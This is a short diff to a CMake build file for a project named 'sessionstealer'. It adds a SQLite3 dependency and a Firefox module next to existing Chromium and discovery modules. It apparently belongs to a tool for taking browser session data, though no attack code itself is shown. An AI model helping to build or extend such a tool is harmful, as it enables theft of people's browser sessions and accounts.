@@ -3,6 +3,8 @@ cmake_minimum_required(VERSION 3.10)
 # When stable set project version to 1.0.0
 project(sessionstealer VERSION 0.0.0 LANGUAGES C CXX)
 
+find_package(SQLite3 REQUIRED)
+
 # -----------------------
 # Global compiler settings
 # -----------------------
@@ -44,3 +46,4 @@ include_directories(${PROJECT_SOURCE_DIR}/include/dlls)
 add_subdirectory(src)
 add_subdirectory(dlls/discovery)
 add_subdirectory(dlls/chromium)
+add_subdirectory(dlls/firefox)
